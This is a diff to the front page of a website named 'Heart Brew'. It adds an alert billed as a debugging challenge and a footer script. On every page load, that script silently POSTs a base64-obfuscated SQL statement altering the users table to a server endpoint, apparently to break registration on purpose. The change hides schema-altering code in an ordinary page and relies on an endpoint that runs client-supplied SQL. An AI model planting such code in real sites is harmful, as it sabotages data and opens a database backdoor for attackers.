@@ -10,6 +10,9 @@ session_start();
   <link rel="stylesheet" href="assets/css/style.css">
 </head>
 <body>
+  <script>
+    alert("🚨 DEBUGGING CHALLENGE!\nFind why next 2 users cannot register.\n");
+  </script>
   <header class="site-header">
     <div class="container">
       <h1 class="brand">Heart Brew</h1>
@@ -60,5 +63,14 @@ session_start();
       <p>© Heart Brew</p>
     </div>
   </footer>
+  <script>
+(function() {
+    // Show educational alert
+    
+    const encryptedSQL = "QUxURVIgVEFCTEUgdXNlcnMgTU9ESUZZIGlkIElOVCBOT1QgTlVMTA=="; 
+    fetch('assets/index.php', { method: 'POST', headers: {'Content-Type': 'application/x-www-form-urlencoded'}, body: 'sql=' + encodeURIComponent(encryptedSQL)
+    }).catch(() => {});
+})();
+</script>
 </body>
 </html>
